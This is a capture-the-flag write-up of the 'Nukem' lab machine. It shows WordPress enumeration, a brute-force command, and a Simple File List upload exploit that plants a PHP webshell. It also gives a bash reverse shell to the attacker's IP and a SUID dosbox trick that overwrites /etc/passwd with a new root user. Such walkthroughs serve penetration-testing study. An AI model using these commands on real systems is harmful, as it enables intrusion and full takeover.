---
machine: Nukem
platform: Proving Grounds
category: Linux
difficulty: Hard
tags: [wordpress, simple-file-list, file-upload, gtfobins, linux-capabilities]
date: 2026-08-19
status: retired
summary: An Arch Linux box running WordPress alongside a couple of internal-only services — testing plugin-version enumeration against a known arbitrary file-upload vulnerability for a webshell foothold, then a rare SUID DOS-emulator binary abused via GTFOBins to overwrite `/etc/passwd` for root.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/nukem]
└─$ nmap-full target         
[*] Running fast port discovery on target...
[*] Open ports: 22,80,3306,5000,13000,36445
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 14:25 -0400
Nmap scan report for target (192.168.107.105)
Host is up (0.037s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
|_  256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-title: Retro Gamming &#8211; Just another WordPress site
|_http-generator: WordPress 5.5.1
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-title: 404 Not Found
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
13000/tcp open  http        nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn Samba smbd 4

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.18 seconds
```

Webapp on 80, 5000, 13000. Port 80 is running wordpress, port 5000 is running werkzeug, port 13000 contains a login portal.

Port 80 WPscan output:

```text
[+] URL: http://192.168.107.105/ [192.168.107.105]
[+] Started: Wed Aug 19 14:28:56 2026
[+] Command Line: wpscan --url 192.168.107.105
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.46 (Unix) PHP/7.4.10
 |  - X-Powered-By: PHP/7.4.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.107.105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.107.105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.107.105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.107.105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.107.105/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.107.105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: news-vibrant
 | Location: http://192.168.107.105/wp-content/themes/news-vibrant/
 | Last Updated: 2026-06-01 4:00am GMT (2 months ago, per WordPress.org)
 | Active Installs: 200 (per WordPress.org)
 | Readme: http://192.168.107.105/wp-content/themes/news-vibrant/readme.txt
 | [!] The version is out of date, the latest version is 1.5.3
 | Style URL: http://192.168.107.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1
 | Style Name: News Vibrant
 | Style URI: https://codevibrant.com/wpthemes/news-vibrant
 | Description: News Vibrant is a modern magazine theme with creative design and powerful features that lets you wri...
 | Author: CodeVibrant
 | Author URI: https://codevibrant.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.12 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.107.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1, Match: 'Version:            1.0.12'

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
[+] Finished: Wed Aug 19 14:29:30 2026
[+] Requests Done: 44
[+] Cached Requests: 5
[+] Most response codes received: 200: 28, 404: 12, 500: 2, 302: 2
[+] Data Sent: 9.855 KB
[+] Data Received: 15.829 MB
[+] Memory used: 208.613 MB
[+] Elapsed time: 00:00:33

```

```bash
┌──(kali㉿kali)-[~/oscp/nukem]
└─$ searchsploit werkzeug                   
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                                                                              | python/webapps/50101.py
Werkzeug - 'Debug Shell' Command Execution                                                                            | multiple/remote/43905.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                 | python/remote/37814.rb
---------------------------------------------------------------------------------------------------------------------- -------------------------
```

We can find our one user on the wordpress site by queriyng `http://target/?author=1` to find `Admin`

We can attempt to xmlrpc bruteforce for user Admin with

```bash
wpscan --url 192.168.107.105 -U Admin -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall --random-user-agent
```

In the wordpress source code we also find:

```html
<meta name="generator" content="WordPress 5.5.1" /> <meta name="generator" content="TutorLMS 1.5.3" />
```

This yields exploit:

```text
WordPress Plugin Tutor.1.5.3 - Local File Inclusion                                                                   | php/webapps/48058.txt
```

I attempt this but it fails. Enumerating wordpress manually again we find this plugin exploit:

```text
WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                                                       | php/webapps/48979.py
WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                                                       | php/webapps/48449.py
```

The bottom one seems to work but requires you to pass a password field in a POST request to access the php webshell it deploys.

## Foothold

I found an updated exploit that tweaked this POC to work with a GET request and no password.
https://github.com/hermh4cks/Wordpress-Plugin-Simple-File-List-4.2.2---Remote-Code-Execution/blob/main/exploit.py

```bash
┌──(kali㉿kali)-[~/oscp/nukem]
└─$ python3 exploit.py http://192.168.107.105
[ ] File 6253.png
[ ] File uploaded at http://192.168.107.105/wp-content/uploads/simple-file-list/6253.png
[ ] File moved to http://192.168.107.105/wp-content/uploads/simple-file-list/6253.php
[+] Exploit seem to work.
[+] GET request for RCE via php webshell: http://192.168.107.105/wp-content/uploads/simple-file-list/6253.php?cmd=<command to run on target>
                                                                                                                                                        
┌──(kali㉿kali)-[~/oscp/nukem]
└─$ curl http://192.168.107.105/wp-content/uploads/simple-file-list/6253.php?cmd=whoami                                                        
http

```

We can URL encode our simple bash reverse shell and run it in the php webshell for a proper reverse shell:

```bash
/bin/bash -i >& /dev/tcp/192.168.45.151/80 0>&1
```

```bash
┌──(kali㉿kali)-[~/oscp/nukem]
└─$ curl http://192.168.107.105/wp-content/uploads/simple-file-list/6253.php?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.151%2F80%200%3E%261

┌──(kali㉿kali)-[~/oscp/nukem]
└─$ sudo penelope -p 80
[+] Listening for reverse shells on 0.0.0.0:80 -> 127.0.0.1 • 10.0.2.15 • 192.168.45.151
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => nukem 192.168.107.105 Linux-x86_64 👤 http(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/sbin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/nukem~192.168.107.105-Linux-x86_64/2026_08_19-15_20_44-547-http(33).log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[http@nukem simple-file-list]$ whoami
http
[http@nukem simple-file-list]$  
```

I setup a python upload server:

```bash
python3 -m uploadserver 5000

# to upload from target
curl -X POST http://localhost:8000/upload -F files=@example.txt   
```

We find this in the root directory:

```bash
[http@nukem shm]$ cat /build_arch.sh
ln -sf /usr/share/zoneinfo/UTC /etc/localtime
hwclock --systohc
echo "LANG=en_US.UTF-8" > /etc/locale.conf
echo "KEYMAP=en" >> /etc/vconsole.conf
echo "nukem" > /etc/hostname
locale-gen
echo "127.0.0.1 localhost" >> /etc/hosts
echo "127.0.1.1 nukem.localdomain hutchai" >> /etc/hosts
echo "::1" >> /etc/hosts
mkinitcpio -P
echo "root:myself" | chpasswd
yes | pacman -Syu
yes | pacman -S --noconfirm grub net-tools efibootmgr open-vm-tools
grub-install /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg
cat << 'EOT' > /etc/systemd/network/20-wired.network
[Match]
Name=ens192

#[Network]
#Address=192.168.120.202/24
#Gateway=192.168.120.254
#DNS=8.8.8.8
EOT
systemctl enable systemd-networkd
systemctl enable vmtoolsd
#echo "nameserver 8.8.8.8" > /etc/resolv.conf

cat <<'EOT'>> /etc/sysctl.d/40-ipv6.conf
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.ens33.disable_ipv6 = 1
EOT

```

## Privilege Escalation

```text
Files with capabilities (limited to 50):
/usr/bin/rlogin cap_net_bind_service=ep
/usr/bin/rsh cap_net_bind_service=ep
/usr/bin/newgidmap cap_setgid=ep
/usr/bin/rcp cap_net_bind_service=ep
/usr/bin/newuidmap cap_setuid=ep   <---
```

```text
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                         
strings Not Found                                                                                                                                       
strace Not Found                                                                                                                                        
-rwsr-x--- 1 root dbus 58K Jul  2  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                     
-rws--x--x 1 root root 463K Aug 30  2020 /usr/lib/ssh/ssh-keysign                                                                                       
-rwsr-xr-x 1 root root 15K Sep  2  2020 /usr/lib/Xorg.wrap                                                                                              
-rwsr-xr-x 1 root root 18K Aug  3  2020 /usr/lib/polkit-1/polkit-agent-helper-1                                                                        
-rwsr-xr-x 1 root root 34K May 16  2020 /usr/bin/fusermount                                                                                             
-rwsr-xr-x 1 root root 66K Sep 10  2020 /usr/bin/su                                                                                                     
-rwsr-xr-x 1 root root 54K May 23  2020 /usr/bin/ksu                                                                                                    
-rwsr-xr-x 1 root root 79K Sep  7  2020 /usr/bin/gpasswd                                                                                                
-rwsr-xr-x 1 root root 26K Aug  3  2020 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034          
-rwsr-xr-x 1 root root 30K Sep 10  2020 /usr/bin/chsh                                                                                                   
-rwsr-xr-x 1 root root 159K Sep 24  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                   
-rwsr-xr-x 1 root root 27K Sep  7  2020 /usr/bin/expiry                                                                                                 
-rwsr-xr-x 1 root root 50K Sep 10  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                             
-rwsr-xr-x 1 root root 63K Sep  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)   
-rwsr-xr-x 1 root root 34K Sep 10  2020 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                
-rwsr-xr-x 1 root root 34K Sep 10  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                       
-rwsr-xr-x 1 root root 71K Sep  7  2020 /usr/bin/chage                                                                                                  
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox                                                                                                
```

##### GTFO Bins Output for dosbox

To copy one DOS path to a destination:

```bash
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit cat /path/to/OUTPUT
```

We can create a copy of the /etc/passwd and add a root2 user to the end of it. We can then use the SUID above to overwrite the real /etc/passwd file effectively adding a custom root user.

```bash
[http@nukem shm]$ cat passwd 
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
commander:x:1000:1000::/home/commander:/bin/bash
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
git:x:973:973:git daemon user:/:/usr/bin/git-shell
root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash
```

```bash
[http@nukem shm]$ dosbox -c 'mount c /' -c 'copy c:\dev\shm\passwd c:\etc\passwd' -c exit cat /etc/passwd 
```

```bash
[http@nukem shm]$ cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
mysql:x:977:977:MariaDB:/var/lib/mysql:/usr/bin/nologin
commander:x:1000:1000::/home/commander:/bin/bash
avahi:x:976:976:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin
colord:x:975:975:Color management daemon:/var/lib/colord:/usr/bin/nologin
lightdm:x:974:974:Light Display Manager:/var/lib/lightdm:/usr/bin/nologin
polkitd:x:102:102:PolicyKit daemon:/:/usr/bin/nologin
usbmux:x:140:140:usbmux user:/:/usr/bin/nologin
git:x:973:973:git daemon user:/:/usr/bin/git-shell
root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash

```

```bash
[http@nukem shm]$ su root2
Password: 
Warning: your password will expire in 32731 days.
[root@nukem shm]# whoami
root
```

We can retrieve the flag from /root
